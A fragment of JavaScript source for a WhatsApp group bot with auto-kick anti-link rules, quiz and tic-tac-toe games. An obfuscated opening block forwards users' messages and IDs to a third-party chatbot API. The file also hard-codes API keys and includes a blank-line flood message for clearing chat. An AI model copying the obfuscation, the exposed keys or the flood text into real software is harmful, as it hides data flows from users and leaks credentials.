var _0x33fa3e=_0x465d;function _0x2a31(){var _0x124451=['reply','1109740LfSEyY','includes','9059424ATMYLh','702DCvREW','3129360vqgfpx','sender','@s.whatsapp.net','http://api.brainshop.ai/get?bid=167831&key=BFghpAKanUPXcLWQ&uid=','error','9eHTAtD','chatbot','catch','&msg=','1931044WXDcdy','data','split','18074ZBFvdT','user','GET','27825912kQipLx','62352dAoPvn','settings','http://api.brainshop.ai/get?bid=167831&key=BFghpAKanUPXcLWQ&uid=MikuBotInc.user.id&msg='];_0x2a31=function(){return _0x124451;};return _0x2a31();}function _0x465d(_0x46eeb2,_0x5f0900){var _0x2a3178=_0x2a31();return _0x465d=function(_0x465d22,_0x141be9){_0x465d22=_0x465d22-0x110;var _0x9b342b=_0x2a3178[_0x465d22];return _0x9b342b;},_0x465d(_0x46eeb2,_0x5f0900);}(function(_0x3277b6,_0x4246a7){var _0x1e4f2f=_0x465d,_0x355551=_0x3277b6();while(!![]){try{var _0x22af3f=-parseInt(_0x1e4f2f(0x11c))/0x1+parseInt(_0x1e4f2f(0x115))/0x2+parseInt(_0x1e4f2f(0x111))/0x3*(parseInt(_0x1e4f2f(0x120))/0x4)+parseInt(_0x1e4f2f(0x124))/0x5+-parseInt(_0x1e4f2f(0x123))/0x6*(-parseInt(_0x1e4f2f(0x118))/0x7)+parseInt(_0x1e4f2f(0x122))/0x8+-parseInt(_0x1e4f2f(0x11b))/0x9;if(_0x22af3f===_0x4246a7)break;else _0x355551['push'](_0x355551['shift']());}catch(_0x32822d){_0x355551['push'](_0x355551['shift']());}}}(_0x2a31,0xabe65));if(db[_0x33fa3e(0x11d)][botNumber][_0x33fa3e(0x112)]){if(m[_0x33fa3e(0x125)][_0x33fa3e(0x121)](_0x33fa3e(0x126))){var mhata=''+command;sehcalaz=MikuBotInc[_0x33fa3e(0x119)]['id'][_0x33fa3e(0x117)]('@')[0x0];var duzvi=encodeURI(mhata);const bhabhi={'method':_0x33fa3e(0x11a),'url':_0x33fa3e(0x11e)+command};await axios['get'](_0x33fa3e(0x127)+sehcalaz+_0x33fa3e(0x114)+duzvi)['then'](function(_0x55e8cd){var _0x4963f0=_0x33fa3e,_0x207a24='';_0x207a24=_0x55e8cd[_0x4963f0(0x116)]['cnt'],m[_0x4963f0(0x11f)](_0x207a24);})[_0x33fa3e(0x113)](function(_0x4cac14){var _0x12b308=_0x33fa3e;console[_0x12b308(0x110)](_0x4cac14);});}}

//Respon Cmd with media\\
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
        let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: anya.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, anya.user.id)
        messages.key.id = m.key.id
        messages.pushName = pushname
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        anya.ev.emit('messages.upsert', msg)
        }

destrava22 = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n
🗑\n  *_CHAT LIMPO_*✅️`


if (db.chats[m.chat].antilink) {
if (budy.includes('https://chat.whatsapp.com/') || (budy.includes('https://'))) {
if (!m.key.fromMe) {
await anya.sendMessage(from, {text: 'Links não são permitidos nesse grupo👋'}, {quoted: m})
setTimeout(async function () {
await anya.sendMessage(from, { delete: m.key })
}, 1000)
anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
}

if (db.chats[m.chat].wame) {
if (budy.match(`wa.me/`)) {
m.reply(`wa.me não são permitidos`)
if (!isBotAdmins) return m.reply(`admin?😑`)
let gclink = (`https://wa.me/`)
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`Banido`)
if (isAdmins) return m.reply(`admin?😑`)
if (isCreator) return m.reply(`criador? 😑`)
anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
var Apik = ''
var socket = fetchJson('wss://wss.allsportsapi.com/live_events?widgetKey='+ 'db7fca1f4dfd0fa8b50c30c3b4569a61e0c5c93a79c18864bf9c9b6ab635c427' +'&timezone=+02:00');
socket.onmessage = function(e) {
  if (e.data) {
    var matcheData = JSON.parse(e.data);
    console.log(`*JUST IN:*` + matcheData)
  }
}

async function randompalavra() {
    return new Promise(async (resolve, reject) => {
fetch('https://www.palabrasaleatorias.com/palavras-aleatorias.php?fs=1&fs2=0&Submit=Nova+palavra',).then(async function (res, err) {
if(err) reject(err)    
var $ = cheerio.load(await res.text())
resolve($('body > center > center > table:nth-child(4) > tbody > tr > td > div')[0].children[0].data)
})
    }) 
}
//mute chat
 if (db.chats[m.chat].mute && !isAdmins && !isCreator) {
 return
 }
//write database every 1minute
setInterval(() => {
 fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
}, 60 * 1000)
//But5Loc
var nextMinutes = Math.random() * 300 + 30;
setTimeout(function(){
  anya.sendMessage(anya.user.id, {text: `🤠`,contextInfo: { externalAdReply:{title:"anya-md",body:"anya-md",showAdAttribution: true,mediaType:2,thumbnail: fs.readFileSync(`./lib/anya.jpg`) ,mediaUrl:`https://wa.me/+558898204406`, sourceUrl: `https://wa.me/+558898204406` }}}, {quoted: m})
  //anouncement by sacole 
}, nextMinutes * 300 * 1000);
const send5Butlmg = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
    var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
   locationMessage: { degreesLatitude: 0, degreesLongtitude: 0, jpegThumbnail: img },
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
   }
   }
   }), options)
    return anya.relayMessage(jid, template.message, { messageId: template.key.id })
    }
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
 let user = Object.keys(global.db.users)
 let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
 for (let jid of user) global.db.users[jid].limit = limitUser
 console.log('Limite resetado')
}, {
 scheduled: true,
 timezone: "Africa/Harare"
})
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
 userJid: anya.user.id,
 quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, anya.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
 ...chatUpdate,
 messages: [proto.WebMessageInfo.fromObject(messages)],
 type: 'append'
}
anya.ev.emit('messages.upsert', msg)
}
    
if (('family100'+m.chat in _family100) && isCmd) {
 kuis = true
 let room = _family100['family100'+m.chat]
 let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
 let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
 if (!isSurender) {
   let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
   if (room.terjawab[index]) return !0
   room.terjawab[index] = m.sender
 }
 let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
 let caption = `
Answer the following questions :\n${room.soal}\n\n\nThere is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}
${isWin ? `All Answers Answered` : isSurender ? 'Give up!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
 anya.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
 if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebaklagu[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await anya.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'GUESS THE MUSIC' }, type: 1 }], ` Guess The Song\n\nCorrect Answer 🎉\n\nWant to play again? Miku bot INC`, `${nomedobot}`, m)
   delete tebaklagu[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = kuismath[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await m.reply(`Math Quiz\n\nCorrect answer 🎉\n\nWant to play again? Send ${prefix}math mode`)
   delete kuismath[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebakgambar[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await anya.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], ` Guess The Picture\n\nCorrect answer 🎉\n\nWant to play again? Miku bot INC`, `${nomedobot}`, m)
   delete tebakgambar[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebakkata[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await anya.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'GUESS THE WORD' }, type: 1 }], `Guess The Word\n\nCorrect answer 🎉\n\nWant to play again? Miku bot INC`, `${nomedobot}`, m)
   delete tebakkata[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = caklontong[m.sender.split('@')[0]]
    deskripsi = caklontong_desk[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await anya.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'GUESS LONTONG' }, type: 1 }], `Guess Lontong\n\nCorrect answer 🎉\n*${deskripsi}*\n\nWant to play again? Miku bot INC`, `${nomedobot}`, m)
   delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebakkalimat[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await anya.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], ` Guess The Sentence \n\nCorrect answer 🎉\n\nWant to play again? Miku bot INC`, `${nomedobot}`, m)
   delete tebakkalimat[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebaklirik[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await anya.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], ` Guess The Lyrics \n\nCorrect answer 🎉\n\nWant to play again? Miku bot INC`, `${nomedobot}`, m)
   delete tebaklirik[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}
    
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebaktebakan[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
   await anya.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Riddles' }, type: 1 }], `Riddles \n\nCorrect answer 🎉\n\nWant to play again? Miku bot INC`, `${nomedobot}`, m)
   delete tebaktebakan[m.sender.split('@')[0]]
 } else m.reply('*WRONG ANSWER!*')
}
    this.game = this.game ? this.game : {}
    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
    if (room) {
    let ok
    let isWin = !1
    let isTie = !1
    let isSurrender = !1
    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
    isSurrender = !/^[1-9]$/.test(m.text)
    if (m.sender !== room.game.currentTurn) { 
    if (!isSurrender) return !0
    }
    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
    m.reply({
    '-3': 'Game has ended',
    '-2': 'Invalid',
    '-1': 'Invalid Position',
    0: 'Invalid Position',
    }[ok])
    return !0
    }
    if (m.sender === room.game.winner) isWin = true
    else if (room.game.board === 511) isTie = true
    let arr = room.game.render().map(v => {
    return {
    X: '❌',
    O: '⭕',
    1: '1️⃣',
    2: '2️⃣',
    3: '3️⃣',
    4: '4️⃣',
    5: '5️⃣',
    6: '6️⃣',
    7: '7️⃣',
    8: '8️⃣',
    9: '9️⃣',
    }[v]
    })
    if (isSurrender) {
    room.game._currentTurn = m.sender === room.game.playerX
    isWin = true
    }
    let winner = isSurrender ? room.game.currentTurn : room.game.winner
    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *give up* to surrender and admit defeat`
    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
    if (room.x !== room.o) await anya.sendText(room.x, str, m, { mentions: parseMention(str) } )
    await anya.sendText(room.o, str, m, { mentions: parseMention(str) } )
    if (isTie || isWin) {
    delete this.game[room.id]
    }
    }
    
if (isTTT && isPlayer2) {
      if (isButton == "!Y") {
        tto = ky_ttt.filter((ghg) => ghg.id.includes(m.chat));
        tty = tto[0];
        angka = tto[0].angka;
        ucapan = `*🎳 Jogo Da Velha 🎲*

Jogador1 @${tty.player1.split("@")[0]}=❌
Jogador2 @${tty.player2.split("@")[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Sua vez = @${tty.player1.split("@")[0]}`;
        anya.sendMessage(
          m.chat,
          {
            text: ucapan,
            contextInfo: { mentionedJid: [tty.player1, tty.player2] },
          },
          { quoted: m }
        );
      }
      if (isButton == "!N") {
        tto = ky_ttt.filter((ghg) => ghg.id.includes(m.chat));
        tty = tto[0];
        naa = ky_ttt.filter((toek) => !toek.id.includes(m.chat));
        ky_ttt = naa;
        anya.sendMessage(
          m.chat,
          {
            text: `@${tty.player2.split("@")[0]} Recusou o desafio 😔`,
            contextInfo: { mentionedJid: [tty.player2] },
          },
          { quoted: m }
        );
      }
    }

    if (isTTT && isPlayer1) {
      nuber = parseInt(budy);
      if (isNaN(nuber)) return;
      if (nuber < 1 || nuber > 9)
        return m.reply("Digite os números corretamente");
      main = ky_ttt.filter((hjh) => hjh.id.includes(m.chat));
      if (!tttawal.includes(main[0].angka[nuber]))
        return m.reply("Tente outra cordenada");
      if (main[0].gilir.includes(m.sender))
        return m.reply("Espere sua vez ._.");
      s = "❌";
      main[0].angka[nuber] = s;
      main[0].gilir = main[0].player1;
      naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
      ky_ttt = naa;
      pop = main[0];
      ky_ttt.push(pop);
      tto = ky_ttt.filter((hgh) => hgh.id.includes(m.chat));
      tty = tto[0];
      angka = tto[0].angka;
      ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`;
      const dinherowin = Math.ceil(Math.random() * 1000);
      ucapmenang = () => {
        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*@${
          tty.player1.split("@")[0]
        }* Ganhou o jogo...\n🥳Parabéns Seu prêmio🏆: ${dinherowin}\n`;
        add_dinheiro(
          `${tty.player1.split("@")[0]}` + "@s.whatsapp.net",
          dinherowin
        );
        ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`;
        anya.sendMessage(
          m.chat,
          { text: ucapan1, contextInfo: { mentionedJid: [tty.player1] } },
          { quoted: m }
        );
        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
        return (ky_ttt = naa);
      };

      if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang();

      if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang();

      if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang();

      if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang();

      if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang();

      if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang();

      if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang();

      if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang();

      if (
        !ttt.includes("1️⃣") &&
        !ttt.includes("2️⃣") &&
        !ttt.includes("3️⃣") &&
        !ttt.includes("4️⃣") &&
        !ttt.includes("5️⃣") &&
        !ttt.includes("6️⃣") &&
        !ttt.includes("7️⃣") &&
        !ttt.includes("8️⃣") &&
        !ttt.includes("9️⃣")
      ) {
        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*_Terminou em Empate 👌_*`;
        ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`;
        m.reply(ucapan1);
        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
        return (ky_ttt = naa);
      }
      ucapan = `*🎳 Jogo Da Velha 🎲*

Jogador2 @${tty.player2.split("@")[0]}=⭕
Jogador1 @${tty.player1.split("@")[0]}=❌

${ttt}

Sua vez = @${tty.player2.split("@")[0]}`;
      anya.sendMessage(
        m.chat,
        {
          text: ucapan,
          contextInfo: { mentionedJid: [tty.player1, tty.player2] },
        },
        { quoted: m }
      );
    }
    if (isTTT && isPlayer2) {
      nuber = parseInt(budy);
      if (isNaN(nuber)) return;
      if (nuber < 1 || nuber > 9)
        return m.reply("Digite os números corretamente");
      main = ky_ttt.filter((hjh) => hjh.id.includes(m.chat));
      if (!tttawal.includes(main[0].angka[nuber]))
        return m.reply("Tente outra cordenada");
      if (main[0].gilir.includes(m.sender))
        return m.reply("Espere sua vez ._.");
      s = "⭕";
      main[0].angka[nuber] = s;
